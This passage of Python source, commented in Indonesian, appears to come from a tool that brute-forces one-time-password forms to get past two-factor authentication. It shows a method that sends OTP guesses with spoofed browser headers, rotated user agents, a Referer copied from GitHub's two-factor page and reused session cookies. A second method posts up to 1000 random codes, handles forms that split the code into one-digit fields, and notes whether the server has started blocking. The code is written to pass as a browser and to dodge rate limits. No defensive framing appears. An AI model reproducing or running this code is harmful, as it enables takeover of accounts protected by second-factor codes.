            'Upgrade-Insecure-Requests': '1',
            'User-Agent': random.choice(self.user_agents),  # Rotasi, tapi match contoh
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://github.com/sessions/two-factor/app',  # Match contoh
            'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Ch-Ua-Full-Version-List': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="132", "Chromium";v="132"',
            'Priority': 'u=0, i'
        }

        # Konversi cookies dari crawl ke dict sederhana {name: value}
        request_cookies = {}
        crawl_cookies = otp_form.get('cookies', {})
        for name, cookie in crawl_cookies.items():
            if isinstance(cookie, Morsel):
                request_cookies[name] = cookie.value
            elif isinstance(cookie, str):
                request_cookies[name] = cookie
            else:
                print(f"[-] Skipping invalid cookie: {name} (type: {type(cookie)})")

        # Print request details
        print(f"[*] Request: URL={url}, Method={method.upper()}, Data={data}")
        print(f"      Headers: {headers}")
        print(f"      Cookies: {request_cookies}")

        # Handle request dengan retry untuk connection error
        max_retries = 5
        for retry in range(max_retries):
            try:
                time.sleep(random.uniform(0.1, 0.5))  # Minimal random delay seperti browser (no jeda fixed)

                if method == 'post':
                    response = self.session.post(url, data=data, headers=headers, cookies=request_cookies, allow_redirects=True)
                else:
                    response = self.session.get(url, params=data, headers=headers, cookies=request_cookies, allow_redirects=True)

                break  # Sukses, keluar loop

            except (requests.exceptions.ConnectionError, requests.exceptions.RequestException) as e:
                print(f"[-] Connection error on attempt {retry + 1}/{max_retries}: {str(e)}")
                if retry == max_retries - 1:
                    print("[-] Max retries reached. Aborting OTP attempt.")
                    return False

        # Debug jika 400 atau error
        if response.status_code in [400, 422]:
            print(f"[!] Error {response.status_code}: Server response text:")
            print(response.text[:500])  # Print 500 char pertama untuk debug (hindari log terlalu panjang)

        # Print response details (sederhana) jika request sukses
        print(f"[*] Response: Status={response.status_code}, Final URL={response.url}")
        if response.history:
            print("      Redirect Chain:")
            for i, r in enumerate(response.history):
                print(f"        {i+1}. {r.url} (Status: {r.status_code})")
        print(f"      Headers (key): Content-Type={response.headers.get('Content-Type')}, Server={response.headers.get('Server')}")
        print(f"      Cookies: {dict(response.cookies)}")

        # Check for possible expired OTP (jika redirect ke login-like page)
        if 'login' in str(response.url).lower():
            print("[!] Possible OTP expired (redirected back to login)")

        if self.detect_bruteforce(response):
            self.brute_force_detected = True
            return False

        success, score = self.evaluate_otp_success(response, url)
        print(f"[*] OTP score: {score}")
        return success


    def otp_bruteforce(self, otp_form, length=6, otp_type='number', max_attempts=1000):
        url = otp_form['action']
        method = otp_form['method'].lower()
        data = {inp['name']: inp['value'] for inp in otp_form['inputs'] if inp['name']}

        otp_fields = []
        for inp in otp_form['inputs']:
            name = inp.get('name', '')
            if name and any(x in name.lower() for x in ['otp', 'code', 'token', 'verification']):
                otp_fields.append(name)

        if not otp_fields:
            return None

        # Check for split fields
        is_split = False
        single_digits = [inp for inp in otp_form['inputs'] if inp.get('maxlength') == '1' and inp.get('type') != 'hidden']
        if len(single_digits) > 1:
            is_split = True
            otp_fields = [inp['name'] for inp in single_digits if inp['name']]
            if len(otp_fields) != len(single_digits):
                print("[-] Inconsistent split fields names")
                return None
            length = len(otp_fields)  # Override input length

        chars = '0123456789' if otp_type == 'number' else '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

        # Prepare headers (sama seperti try_otp)
        headers = self.default_headers.copy()
        headers['Referer'] = self.last_response.url if self.last_response else url
        headers['Origin'] = urlparse(self.base_url).scheme + '://' + urlparse(self.base_url).netloc
        headers['User-Agent'] = random.choice(self.user_agents)
        if 'Content-Type' in headers:
            del headers['Content-Type']

        enctype = otp_form.get('enctype', 'application/x-www-form-urlencoded').lower()

        for attempt in range(max_attempts):
            otp = ''.join(random.choices(chars, k=length))
            temp_data = data.copy()
            if is_split:
                for i, char in enumerate(otp):
                    temp_data[otp_fields[i]] = char
            else:
                temp_data[otp_fields[0]] = otp

            # Print request details (sederhana, setiap attempt)
            print(f"[*] Brute Attempt {attempt + 1}/{max_attempts}: OTP={otp}")
            print(f"      Request: URL={url}, Method={method.upper()}, Data={temp_data}")
            print(f"      Headers (key): User-Agent={headers.get('User-Agent')}, Referer={headers.get('Referer')}, Origin={headers.get('Origin')}")

            if method == 'post':
                if 'multipart' in enctype:
                    post_data = {k: (None, str(v)) for k, v in temp_data.items()}
                    response = self.session.post(url, files=post_data, headers=headers, allow_redirects=True)
                elif 'json' in enctype:
                    headers['Content-Type'] = 'application/json'
                    response = self.session.post(url, json=temp_data, headers=headers, allow_redirects=True)
                else:
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    response = self.session.post(url, data=temp_data, headers=headers, allow_redirects=True)
            else:
                response = self.session.get(url, params=temp_data, headers=headers, allow_redirects=True)

            # Print response details (sederhana, setiap attempt)
            print(f"[*] Response: Status={response.status_code}, Final URL={response.url}")
            if response.history:
                print("      Redirect Chain:")
                for i, r in enumerate(response.history):
                    print(f"        {i+1}. {r.url} (Status: {r.status_code})")
            print(f"      Headers (key): Content-Type={response.headers.get('Content-Type')}, Server={response.headers.get('Server')}")
            print(f"      Cookies: {dict(response.cookies)}")

            # Check for possible expired OTP
            if 'login' in str(response.url).lower():
                print("[!] Possible OTP expired (redirected back to login)")

            if self.detect_bruteforce(response):
                return "BLOCKED"

            success, score = self.evaluate_otp_success(response, url)

            # PERBAIKAN: Override jika false positive (success True tapi final URL indikasi failure)
            failure_urls = ['login', 'otp', 'verify', 'two-factor', '2fa']
            if success and any(fail in str(response.url).lower() for fail in failure_urls):
                print(f"[-] False positive detected: Score {score} but final URL '{response.url}' indicates failure (e.g., redirect to login). Continuing brute force.")
                success = False  # Override to False and continue

            if success:
                # Print detail sukses lengkap
                print(f"[+] OTP brute successful: {otp}")
                print(f"[*] Final Response: Status={response.status_code}, Final URL={response.url}")
                print(f"      Cookies: {dict(response.cookies)}")
                return otp

            time.sleep(0.5)  # Delay minimal 0.5s per attempt untuk hindari expiry cepat
        return None
